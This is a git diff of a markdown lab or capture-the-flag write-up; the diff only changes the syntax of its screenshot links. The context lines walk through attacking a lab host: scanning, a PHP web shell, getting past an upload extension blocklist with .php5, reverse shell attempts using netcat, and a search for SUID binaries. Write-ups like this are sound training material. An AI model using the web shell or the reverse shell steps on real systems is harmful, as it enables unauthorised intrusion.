@@ -24,7 +24,7 @@ A full TCP port scan was executed using Nmap:
 sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.154.136 10.130.154.136
 ```
 
-![Screenshot](../../attachments/Pasted image 20260525011228.png)
+![[Pasted image 20260525011228.png]]
 
 **Open Ports:**
 - **Port 22:** OpenSSH (SSH)
@@ -38,7 +38,7 @@ A directory brute-force attack was conducted against the web server using Gobust
 gobuster dir -u http://10.130.154.136/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![Screenshot](../../attachments/Pasted image 20260525011625.png)
+![[Pasted image 20260525011625.png]]
 
 **Identified Endpoints:**
 - `/panel/` - Document upload form.
@@ -54,20 +54,20 @@ The presence of an unauthenticated upload form alongside a publicly accessible t
 
 Navigating to `http://10.130.154.136/panel/` reveals a file upload interface:
 
-![Screenshot](../../attachments/Pasted image 20260525011846.png)
+![[Pasted image 20260525011846.png]]
 
 ### 2.2 Filter Bypass
 
 An initial attempt to upload a basic PHP web shell (`<?php system($_GET['cmd']); ?>`) named `shell.php` was rejected by the server:
 
-![Screenshot](../../attachments/Pasted image 20260525012315.png)
+![[Pasted image 20260525012315.png]]
 
 The application implements a blocklist restricting the `.php` file extension.
 
 To bypass this restriction, alternative PHP executable extensions were evaluated (`.php5`, `.phtml`, `.phar`, `.phps`). Renaming the file to `attack.php5` successfully bypassed the filter:
 
-![Screenshot](../../attachments/Pasted image 20260525012441.png)
-![Screenshot](../../attachments/Pasted image 20260525012636.png)
+![[Pasted image 20260525012441.png]]
+![[Pasted image 20260525012636.png]]
 
 The payload was accepted and made accessible at `http://10.130.154.136/uploads/attack.php5`.
 
@@ -76,7 +76,7 @@ The payload was accepted and made accessible at `http://10.130.154.136/uploads/a
 Initial attempts to spawn a reverse shell via GET parameters on the web shell encountered syntax issues:
 - `nc -e /bin/bash`: Failed because the host uses an OpenBSD netcat build lacking the `-e` flag.
 
-![Screenshot](../../attachments/Pasted image 20260525013955.png)
+![[Pasted image 20260525013955.png]]
 
 - FIFO pipes and Bash one-liners failed due to special character URL decoding anomalies (`&`, `>`, `<`) in standard GET queries.
 
@@ -90,7 +90,7 @@ nc -lvnp 443
 
 Navigate to `http://10.130.154.136/uploads/php-reverse-shell.php5` to trigger execution:
 
-![Screenshot](../../attachments/Pasted image 20260525015730.png)
+![[Pasted image 20260525015730.png]]
 
 A reverse shell connection is established under the context of `www-data`.
 
@@ -116,7 +116,7 @@ To identify privilege escalation vectors, a search for binaries with the SUID bi
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![Screenshot](../../attachments/Pasted image 20260525022709.png)
+![[Pasted image 20260525022709.png]]
 
 Among standard system utilities, the Python interpreter `/usr/bin/python` possesses the SUID permission bit.
 
